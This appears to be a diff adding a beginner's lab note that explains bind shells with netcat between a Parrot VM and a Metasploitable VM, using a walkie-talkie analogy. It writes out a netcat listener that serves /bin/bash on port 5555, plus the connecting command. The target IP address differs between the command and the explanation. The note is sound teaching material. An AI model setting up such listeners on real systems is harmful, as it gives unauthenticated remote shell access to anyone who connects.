@@ -1,1 +1,28 @@
+#simple explanation
+Bind Shell: You Knock on the Target's Door
 
+Think of it like this:
+The target walkie-talkie waits with its microphone open on a specific channel.
+You need to know which channel it's waiting on.
+You then call the target walkie-talkie on that specific channel.
+Once the connection is made, you can talk and listen, controlling the other walkie-talkie (the target computer).
+
+#step 1
+command from VM 2(metasploitable) nc -nlvp 5555 -e /bin/bash is sets up a listener on your computer that, when connected to, gives the remote user command-line access
+
+nc: It's short for Netcat.
+-n: Think of this as telling only use direct (IP addresses) and not try to look up names in a phone book (DNS). It's a bit more direct.
+-l: This is the key part! It tells to listen for anyone trying to talk to it. It's like turning on the receiver and waiting for someone to call.
+-v: This makes very talkative. It will tell you more about what it's doing, like when someone connects or disconnects. It's like having a little display that shows you the status.
+-p 5555: This sets the channel. In computer terms, this is the port number. We're choosing channel 5555.
+-e /bin/bash: This is the most powerful and potentially risky part. It tells our walkie-talkie that if someone connects to it on channel 5555, it should run a special program called /bin/bash.
+
+
+#step 2
+command from VM 1(parrot) nc -nv 192.168.229.2 5555 is like making a direct call to a specific IP and port to see if it's reachable and listening. The -v option just gives you more information about whether the call went through or not
+
+nc : Netcat.
+-n: use direct number (IP) is 192.168.100.10, and not try to look up a name in DNS. It's a direct connection attempt.
+-v: very talkative. It will tell you more about what it's doing. It's like having a little display that gives you feedback.
+192.168.100.10: This is IP metasploitable you are trying to connect to. 
+5555: This is port number on the other computer that you are trying to connect to. 
